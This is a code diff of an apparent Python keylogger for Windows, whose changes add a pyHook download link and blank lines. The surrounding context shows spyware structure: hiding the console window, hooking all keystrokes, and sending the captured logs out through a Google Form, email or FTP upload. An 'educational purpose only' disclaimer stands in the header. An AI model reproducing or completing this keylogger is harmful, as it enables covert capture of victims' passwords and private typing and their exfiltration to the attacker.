@@ -18,6 +18,10 @@ Python 2.7: http://www.python.org/getit/
 pyHook Module: http://sourceforge.net/projects/pyhook/
 pyrhoncom Module: http://sourceforge.net/projects/pywin32/
 
+pyHook Module - 
+Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
+
+
 NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
 '''
 try:
@@ -33,6 +37,7 @@ import smtplib
 import ftplib
 import datetime,time
 import win32event, win32api, winerror
+
 #Disallowing Multiple Instance
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
@@ -42,6 +47,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x=''
 data=''
 count=0
+
 #Hide Console
 def hide():
     import win32console,win32gui
@@ -61,6 +67,7 @@ mode:
      ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
      """
     return True
+
 #Local Keylogger
 def local():
     global data
@@ -70,6 +77,7 @@ def local():
         fp.close()
         data=''
     return True
+
 #Remote Google Form logs post
 def remote():
     global data
@@ -84,6 +92,7 @@ def remote():
         except Exception as e:
             print e
     return True
+
 #Email Logs
 class TimerClass(threading.Thread):
     def __init__(self):
@@ -120,6 +129,7 @@ Subject: %s
                 except Exception as e:
                     print e
             self.event.wait(120)
+
 #Upload logs to FTP account
 def ftp():
     global data,count
@@ -175,6 +185,7 @@ def main():
             exit(0)
     return True
 main()
+
 def keypressed(event):
     global x,data
     if event.Ascii==13:
@@ -192,6 +203,7 @@ def keypressed(event):
         remote()
     elif x==4:
         ftp()
+
 obj = pyHook.HookManager()
 obj.KeyDown = keypressed
 obj.HookKeyboard()
